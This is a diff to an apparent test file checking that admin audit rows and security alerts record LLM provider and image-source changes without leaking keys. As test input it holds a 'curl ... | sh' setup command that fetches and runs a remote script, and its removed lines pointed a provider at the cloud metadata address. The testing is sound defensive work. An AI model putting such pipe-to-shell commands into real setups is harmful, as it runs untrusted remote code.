@@ -88,10 +88,10 @@ describe("admin audit rows", () => {
   it("records each LLM provider change once, with no key material", async () => {
     api = await bootTestApi();
 
-    const create = await one(api, "POST", "/api/org/llm-providers", { kind: "openai_compatible", name: "internal", baseUrl: "http://user:pw@10.0.0.5:8080/v1?token=abc" });
+    const create = await one(api, "POST", "/api/org/llm-providers", { kind: "openai_compatible", name: "internal", baseUrl: "https://user:pw@llm.example.com:8443/v1?token=abc" });
     const provider = (await create.res.json()) as { id: string };
     expect(create.row).toMatchObject({ action: "llm_provider.create", targetType: "llm_provider", targetId: provider.id, targetName: "internal", actorUserId: "local-user", actorEmail: "local@dev" });
-    expect(create.row.changes).toMatchObject({ kind: "openai_compatible", baseUrl: "http://10.0.0.5:8080/v1" });
+    expect(create.row.changes).toMatchObject({ kind: "openai_compatible", baseUrl: "https://llm.example.com:8443/v1" });
     expect(alertKinds()).toEqual(["llm_provider_created"]);
 
     const rename = await one(api, "PATCH", `/api/org/llm-providers/${provider.id}`, { name: "renamed" });
@@ -99,8 +99,8 @@ describe("admin audit rows", () => {
     expect(rename.row.changes).toEqual({ name: { from: "internal", to: "renamed" } });
     expect(alertKinds()).toEqual(["llm_provider_created"]);
 
-    const move = await one(api, "PATCH", `/api/org/llm-providers/${provider.id}`, { baseUrl: "http://169.254.169.254/v1" });
-    expect(move.row.changes).toEqual({ baseUrl: { from: "http://10.0.0.5:8080/v1", to: "http://169.254.169.254/v1" } });
+    const move = await one(api, "PATCH", `/api/org/llm-providers/${provider.id}`, { baseUrl: "https://llm2.example.com/v1" });
+    expect(move.row.changes).toEqual({ baseUrl: { from: "https://llm.example.com:8443/v1", to: "https://llm2.example.com/v1" } });
     expect(alertKinds()).toEqual(["llm_provider_created", "llm_provider_base_url_changed"]);
 
     const keySet = await one(api, "PUT", `/api/org/llm-providers/${provider.id}/key`, { apiKey: SECRET_KEY });
@@ -161,6 +161,9 @@ describe("admin audit rows", () => {
   });
 
   it("records image source changes, manual bakes, and built-in image edits", async () => {
+    // Pins the audit rows for changes that apply at once. Second-admin
+    // approval, where present, holds content changes back; it is off here.
+    vi.stubEnv("VALET_IMAGE_SOURCE_APPROVAL", "off");
     api = await bootTestApi();
     const db = api.providers.db;
 
@@ -183,10 +186,21 @@ describe("admin audit rows", () => {
       await db.insert(imageSources).values({ id: "src_builtin", orgId: "local-org", kind: "base", parentId: null, name: "default-full", externalRef: null, pullSecretName: null, setupCommands: [], profile: "full", repoHost: null, repoFullName: null, cloneUrl: null, schedule: "nightly", enabled: true, lastBoundAt: null, createdAt: now, updatedAt: now });
       builtIn = (await db.select().from(imageSources).where(eq(imageSources.id, "src_builtin")).limit(1))[0];
     }
-    const edit = await one(api, "PATCH", `/api/org/sources/${builtIn!.id}`, { setupCommands: ["curl https://x.example/i.sh | sh", `export API_TOKEN=${SECRET_KEY}`] });
-    expect(edit.row.changes).toMatchObject({ builtIn: true, setupCommands: { from: [], to: ["curl https://x.example/i.sh | sh", "export API_TOKEN=[redacted]"] } });
-    expect(JSON.stringify(edit.row)).not.toContain(SECRET_KEY);
-    expect(alertKinds()).toEqual(["image_source_created", "image_source_changed", "builtin_image_changed"]);
+    // A built-in edit either applies and alerts, or the route refuses it
+    // (read-only built-ins) and nothing is recorded.
+    const before = (await db.select().from(adminAuditEvents)).length;
+    const editRes = await send(api, "PATCH", `/api/org/sources/${builtIn!.id}`, { setupCommands: ["curl https://x.example/i.sh | sh", `export API_TOKEN=${SECRET_KEY}`] });
+    const rows = await db.select().from(adminAuditEvents);
+    if (editRes.status === 403) {
+      expect(rows).toHaveLength(before);
+      expect(alertKinds()).toEqual(["image_source_created", "image_source_changed"]);
+    } else {
+      expect(editRes.status).toBe(200);
+      const edit = rows.find((r) => r.targetId === builtIn!.id && r.action === "image_source.update")!;
+      expect(edit.changes).toMatchObject({ builtIn: true, setupCommands: { from: [], to: ["curl https://x.example/i.sh | sh", "export API_TOKEN=[redacted]"] } });
+      expect(JSON.stringify(edit)).not.toContain(SECRET_KEY);
+      expect(alertKinds()).toEqual(["image_source_created", "image_source_changed", "builtin_image_changed"]);
+    }
 
     const removed = await one(api, "DELETE", `/api/org/sources/${source.id}`);
     expect(removed.row).toMatchObject({ action: "image_source.delete", targetId: source.id });
@@ -328,7 +342,7 @@ describe("security alert delivery", () => {
     const hook = await receiver();
     vi.stubEnv(SECURITY_ALERT_WEBHOOK_ENV, hook.url);
     api = await bootTestApi();
-    const res = await send(api, "POST", "/api/org/llm-providers", { kind: "openai_compatible", name: "internal", baseUrl: "http://10.0.0.5/v1?key=leak" });
+    const res = await send(api, "POST", "/api/org/llm-providers", { kind: "openai_compatible", name: "internal", baseUrl: "https://llm.example.com/v1?key=leak" });
     expect(res.status).toBe(201);
     await flushSecurityAlerts();
     expect(hook.bodies).toHaveLength(1);
